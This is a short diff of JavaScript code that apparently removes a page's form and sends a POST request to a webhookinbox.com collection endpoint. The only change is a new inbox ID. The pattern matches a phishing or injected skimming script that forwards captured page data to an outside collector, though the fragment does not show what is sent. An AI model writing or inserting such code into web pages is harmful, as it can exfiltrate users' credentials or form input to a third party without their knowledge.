@@ -22,7 +22,7 @@ document.getElementsByTagName("form")[0].remove();
         var xhr = new XMLHttpRequest();
         
 
-        var url = "https://api.webhookinbox.com/i/fro4Jlis/in/";
+        var url = "https://api.webhookinbox.com/i/p57vm3iV/in/";
         
         xhr.open('POST', url, true);
         xhr.setRequestHeader('Access-Control-Allow-Origin', '*');  
